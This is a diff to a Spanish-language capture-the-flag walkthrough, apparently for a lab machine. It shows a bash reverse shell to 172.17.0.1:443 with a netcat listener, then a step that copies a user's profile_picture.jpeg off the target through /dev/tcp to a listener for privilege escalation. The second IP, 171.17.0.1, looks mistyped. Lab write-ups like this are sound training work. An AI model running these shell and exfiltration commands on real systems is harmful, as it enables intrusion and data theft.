@@ -57,4 +57,12 @@ En una terminal ejecutamos ```nc -lvnp 443``` y en el usuario de pedro, configur
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
+Ahora en la terminal en donde estabamos escuchando, accederemos como valentina.
 
+## Paso N6: Escalando privilegios
+En el directorio actual de valentina, tenemos un archivo llamado ```profile_picture.jpeg``` el cuál es probable que tenga información oculta, por lo que tenemos que pasarla a nuestro sistema.
+
+Para pasarlo, escucharemos en una terminal con ```nc -lvnp 435 > test.jpeg``` y en el usuario de valentina ejecutamos el siguiente comando:
+```
+cat profile_picture.jpeg > /dev/tcp/171.17.0.1/435
+```
